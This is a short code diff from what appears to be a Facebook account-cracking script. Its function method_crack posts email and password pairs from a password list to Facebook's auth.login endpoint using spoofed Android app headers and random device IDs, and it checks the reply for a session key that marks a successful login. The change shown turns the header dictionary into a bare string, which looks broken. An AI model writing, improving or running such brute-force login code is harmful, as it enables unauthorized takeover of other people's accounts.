@@ -104,7 +104,7 @@ def method_crack(ids,passlist):
             adid=str(uuid.uuid4())
             device_id=str(uuid.uuid4())
             datax={'adid': adid, 'format': 'json', 'device_id': device_id, 'email': ids, 'password': pas, 'generate_analytics_claims': '1', 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'meta_inf_fbmeta': '', 'currently_logged_in_userid': '0', 'fb_api_req_friendly_name': 'authenticate'}
-            header={'User-Agent': 'Dalvik/2.1.0 (Linux; U; 4.0.3; TechnoSparkiGo Build/XT45SK) [FBAN/FB4A;FBAV/352.0.0.145;FBPN/com.facebook.katana;FBLC/fr_FR;FBBV/131970932;FBCR/UFONE-PAKTel;FBMF/techno;FBBD/techno;FBDV/TechnoSparkiGo;FBSV/4.0.3;FBCA/x86:null;FBDM/{density=2.75,width=1080,height=2028};FB_FW/1;FBRV/411258703;]'
+            header= 'Dalvik/2.1.0 (Linux; U; 4.0.3; TechnoSparkiGo Build/XT45SK) [FBAN/FB4A;FBAV/352.0.0.145;FBPN/com.facebook.katana;FBLC/fr_FR;FBBV/131970932;FBCR/UFONE-PAKTel;FBMF/techno;FBBD/techno;FBDV/TechnoSparkiGo;FBSV/4.0.3;FBCA/x86:null;FBDM/{density=2.75,width=1080,height=2028};FB_FW/1;FBRV/411258703;]'
             url='https://api.facebook.com/method/auth.login'
             reqx=requests.post(url,data=datax,headers=header).json()
             if 'session_key' in reqx:
